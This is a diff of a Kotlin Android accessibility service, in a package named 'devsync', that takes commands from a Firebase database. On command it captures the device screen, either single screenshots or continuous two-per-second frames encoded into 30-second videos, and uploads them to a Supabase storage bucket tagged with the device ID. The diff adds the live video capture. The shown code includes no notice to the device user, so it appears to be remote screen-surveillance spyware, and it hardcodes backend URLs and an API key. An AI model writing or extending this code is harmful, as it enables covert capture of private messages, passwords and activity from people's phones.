@@ -1,152 +1,246 @@
 package com.example.devsync
 
-  import android.accessibilityservice.AccessibilityService
-  import android.accessibilityservice.AccessibilityServiceInfo
-  import android.graphics.Bitmap
-  import android.os.Build
-  import android.provider.Settings
-  import android.view.accessibility.AccessibilityEvent
-  import com.google.firebase.database.DataSnapshot
-  import com.google.firebase.database.DatabaseError
-  import com.google.firebase.database.FirebaseDatabase
-  import com.google.firebase.database.ServerValue
-  import com.google.firebase.database.ValueEventListener
-  import kotlinx.coroutines.*
-  import okhttp3.*
-  import okhttp3.MediaType.Companion.toMediaType
-  import okhttp3.RequestBody.Companion.toRequestBody
-  import java.io.ByteArrayOutputStream
-  import java.util.concurrent.Executor
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.graphics.Bitmap
+import android.os.Build
+import android.provider.Settings
+import android.view.accessibility.AccessibilityEvent
+import com.google.firebase.database.*
+import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.ByteArrayOutputStream
+import java.io.File
+import java.util.concurrent.Executor
 
-  class ScreenshotService : AccessibilityService() {
+class ScreenshotService : AccessibilityService() {
 
-      companion object {
-          const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
-          const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
-          const val SUPABASE_KEY = "sb_publishable_v7x5HUzpIf3LNyTMGRcGFw_8g2QV3BY"
-          const val BUCKET = "screenshots"
-      }
+    companion object {
+        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
+        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
+        const val SUPABASE_KEY = "sb_publishable_v7x5HUzpIf3LNyTMGRcGFw_8g2QV3BY"
+        const val BUCKET_SS    = "screenshots"
+        const val BUCKET_VID   = "videos"
+        const val FPS          = 2           // 2 screenshots/sec
+        const val CHUNK_SEC    = 30          // 30 sec per video
+        const val FRAMES_PER_CHUNK = FPS * CHUNK_SEC  // 60 frames
+    }
 
-      private val deviceId by lazy {
-          Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-      }
-      private val database by lazy {
-          FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
-      }
-      private val regRef by lazy {
-          FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
-      }
-      private val httpClient = OkHttpClient()
+    private val deviceId by lazy {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    }
+    private val database by lazy {
+        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
+    }
+    private val regRef by lazy {
+        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
+    }
+    private val http = OkHttpClient.Builder()
+        .callTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
+        .build()
 
-      override fun onServiceConnected() {
-          super.onServiceConnected()
-          val info = AccessibilityServiceInfo().apply {
-              eventTypes = AccessibilityEvent.TYPES_ALL_MASK
-              feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-              flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
-          }
-          serviceInfo = info
-          regRef.child("accessibility_granted").setValue(true)
-          listenForScreenshotCommand()
-      }
+    private var liveCapJob: Job? = null
+    private var isLiveEnabled = false
 
-      private fun listenForScreenshotCommand() {
-          database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
-              override fun onDataChange(snapshot: DataSnapshot) {
-                  if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
-                      database.child("take_screenshot").removeValue()
-                      regRef.child("lastStatus").setValue("⏳ Taking screenshot...")
-                      regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
-                      captureScreen()
-                  }
-              }
-              override fun onCancelled(error: DatabaseError) {}
-          })
-      }
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        serviceInfo = AccessibilityServiceInfo().apply {
+            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
+            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+        }
+        regRef.child("accessibility_granted").setValue(true)
+        listenForCommands()
+    }
 
-      private fun captureScreen() {
-          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-              val executor = Executor { command -> command.run() }
-              takeScreenshot(
-                  android.view.Display.DEFAULT_DISPLAY,
-                  executor,
-                  object : TakeScreenshotCallback {
-                      override fun onSuccess(screenshotResult: ScreenshotResult) {
-                          val bitmap = Bitmap.wrapHardwareBuffer(
-                              screenshotResult.hardwareBuffer,
-                              screenshotResult.colorSpace
-                          )?.copy(Bitmap.Config.ARGB_8888, false)
-                          screenshotResult.hardwareBuffer.close()
-                          if (bitmap != null) {
-                              uploadToSupabase(bitmap)
-                          } else {
-                              reportStatus("❌ Screenshot bitmap null")
-                          }
-                      }
-                      override fun onFailure(errorCode: Int) {
-                          reportStatus("❌ Screenshot failed: code $errorCode")
-                      }
-                  }
-              )
-          } else {
-              reportStatus("❌ Screenshot requires Android 11+")
-          }
-      }
+    private fun listenForCommands() {
+        // Single screenshot
+        database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                if (s.exists() && s.getValue(Boolean::class.java) == true) {
+                    database.child("take_screenshot").removeValue()
+                    reportStatus("⏳ Taking screenshot...")
+                    captureOne { bmp -> uploadScreenshot(bmp) }
+                }
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
 
-      private fun uploadToSupabase(bitmap: Bitmap) {
-          CoroutineScope(Dispatchers.IO).launch {
-              try {
-                  val stream = ByteArrayOutputStream()
-                  bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
-                  val bytes = stream.toByteArray()
+        // Live capture toggle (2/sec → 30s video)
+        database.child("live_capture_enabled").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                val enabled = s.getValue(Boolean::class.java) ?: false
+                if (enabled && !isLiveEnabled) {
+                    isLiveEnabled = true
+                    startLiveCapture()
+                } else if (!enabled && isLiveEnabled) {
+                    isLiveEnabled = false
+                    liveCapJob?.cancel()
+                    reportStatus("⏹ Live capture stopped")
+                }
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
 
-                  val timestamp = System.currentTimeMillis()
-                  val fileName = "${deviceId}_${timestamp}.jpg"
+        // Stop all
+        database.child("stop_all").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(s: DataSnapshot) {
+                if (s.exists() && s.getValue(Boolean::class.java) == true) {
+                    isLiveEnabled = false
+                    liveCapJob?.cancel()
+                }
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
+    }
 
-                  val body = bytes.toRequestBody("image/jpeg".toMediaType())
-                  val request = Request.Builder()
-                      .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
-                      .header("Authorization", "Bearer $SUPABASE_KEY")
-                      .header("apikey", SUPABASE_KEY)
-                      .header("Content-Type", "image/jpeg")
-                      .header("x-upsert", "true")
-                      .post(body)
-                      .build()
+    // ── SINGLE SCREENSHOT ─────────────────────────────────────────────────────
 
-                  httpClient.newCall(request).execute().use { response ->
-                      if (response.isSuccessful) {
-                          val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
-                          val screenshotRef = FirebaseDatabase.getInstance(DB_URL)
-                              .getReference("screenshots").push()
-                          screenshotRef.setValue(mapOf(
-                              "deviceId"  to deviceId,
-                              "url"       to publicUrl,
-                              "timestamp" to timestamp
-                          ))
-                          reportStatus("📸 Screenshot uploaded ✅")
-                      } else {
-                          // Show full Supabase error message for debugging
-                          val errBody = response.body?.string()?.take(120) ?: "no body"
-                          reportStatus("❌ Upload ${response.code}: $errBody")
-                      }
-                  }
-              } catch (e: Exception) {
-                  reportStatus("❌ Upload error: ${e.message?.take(100)}")
-              }
-          }
-      }
+    private fun captureOne(onResult: (Bitmap) -> Unit) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            reportStatus("❌ Requires Android 11+"); return
+        }
+        val executor = Executor { it.run() }
+        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
+            object : TakeScreenshotCallback {
+                override fun onSuccess(r: ScreenshotResult) {
+                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
+                        ?.copy(Bitmap.Config.ARGB_8888, false)
+                    r.hardwareBuffer.close()
+                    if (bmp != null) onResult(bmp)
+                    else reportStatus("❌ Bitmap null")
+                }
+                override fun onFailure(code: Int) { reportStatus("❌ Capture failed: $code") }
+            })
+    }
 
-      private fun reportStatus(status: String) {
-          regRef.child("lastStatus").setValue(status)
-          regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
-      }
+    // ── LIVE CAPTURE ──────────────────────────────────────────────────────────
 
-      override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
-      override fun onInterrupt() {}
+    private fun startLiveCapture() {
+        liveCapJob = CoroutineScope(Dispatchers.Main).launch {
+            while (isActive && isLiveEnabled) {
+                val frames = mutableListOf<Bitmap>()
+                reportStatus("🔴 Live capture: collecting frames...")
 
-      override fun onDestroy() {
-          super.onDestroy()
-          regRef.child("accessibility_granted").setValue(false)
-      }
-  }
-  
+                // Collect FRAMES_PER_CHUNK frames at 2/sec
+                repeat(FRAMES_PER_CHUNK) {
+                    if (!isActive || !isLiveEnabled) return@repeat
+                    captureOne { bmp -> frames.add(bmp) }
+                    delay(1000L / FPS)
+                }
+
+                if (frames.size >= 10) {
+                    reportStatus("🎬 Encoding ${frames.size} frames to video...")
+                    withContext(Dispatchers.IO) {
+                        encodeAndUpload(frames)
+                    }
+                    frames.forEach { it.recycle() }
+                } else {
+                    frames.forEach { it.recycle() }
+                }
+            }
+        }
+    }
+
+    private fun encodeAndUpload(frames: List<Bitmap>) {
+        try {
+            val outFile = File(cacheDir, "live_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")
+            val ok = VideoEncoderHelper.encode(frames, FPS, outFile)
+            if (ok && outFile.length() > 0) {
+                uploadVideo(outFile)
+            } else {
+                reportStatus("❌ Video encoding failed")
+            }
+        } catch (e: Exception) {
+            reportStatus("❌ Encode error: ${e.message?.take(80)}")
+        }
+    }
+
+    private fun uploadVideo(file: File) {
+        try {
+            val fileName = "live_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.mp4"
+            val body = file.readBytes().toRequestBody("video/mp4".toMediaType())
+            val req = Request.Builder()
+                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_VID/$fileName")
+                .header("Authorization", "Bearer $SUPABASE_KEY")
+                .header("apikey", SUPABASE_KEY)
+                .header("Content-Type", "video/mp4")
+                .header("x-upsert", "true")
+                .post(body)
+                .build()
+            http.newCall(req).execute().use { resp ->
+                if (resp.isSuccessful) {
+                    val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_VID/$fileName"
+                    FirebaseDatabase.getInstance(DB_URL)
+                        .getReference("live_videos").push()
+                        .setValue(mapOf(
+                            "deviceId"  to deviceId,
+                            "url"       to url,
+                            "timestamp" to System.currentTimeMillis(),
+                            "fileName"  to fileName
+                        ))
+                    reportStatus("🎬 Video uploaded ✅ (${file.length() / 1024}KB)")
+                } else {
+                    val err = resp.body?.string()?.take(100) ?: ""
+                    reportStatus("❌ Video upload failed ${resp.code}: $err")
+                }
+            }
+            file.delete()
+        } catch (e: Exception) {
+            reportStatus("❌ Video upload error: ${e.message?.take(80)}")
+        }
+    }
+
+    // ── SINGLE SCREENSHOT UPLOAD ───────────────────────────────────────────────
+
+    private fun uploadScreenshot(bitmap: Bitmap) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val stream = ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
+                val bytes = stream.toByteArray()
+                val ts = System.currentTimeMillis()
+                val fileName = "${deviceId}_$ts.jpg"
+                val body = bytes.toRequestBody("image/jpeg".toMediaType())
+                val req = Request.Builder()
+                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET_SS/$fileName")
+                    .header("Authorization", "Bearer $SUPABASE_KEY")
+                    .header("apikey", SUPABASE_KEY)
+                    .header("Content-Type", "image/jpeg")
+                    .header("x-upsert", "true")
+                    .post(body)
+                    .build()
+                http.newCall(req).execute().use { resp ->
+                    if (resp.isSuccessful) {
+                        val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_SS/$fileName"
+                        FirebaseDatabase.getInstance(DB_URL)
+                            .getReference("screenshots").push()
+                            .setValue(mapOf("deviceId" to deviceId, "url" to url, "timestamp" to ts))
+                        reportStatus("📸 Screenshot uploaded ✅")
+                    } else {
+                        val err = resp.body?.string()?.take(120) ?: ""
+                        reportStatus("❌ Upload ${resp.code}: $err")
+                    }
+                }
+            } catch (e: Exception) {
+                reportStatus("❌ Upload error: ${e.message?.take(80)}")
+            }
+        }
+    }
+
+    private fun reportStatus(status: String) {
+        regRef.child("lastStatus").setValue(status)
+        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
+    }
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
+    override fun onInterrupt() {}
+    override fun onDestroy() {
+        super.onDestroy()
+        isLiveEnabled = false
+        liveCapJob?.cancel()
+        regRef.child("accessibility_granted").setValue(false)
+    }
+}
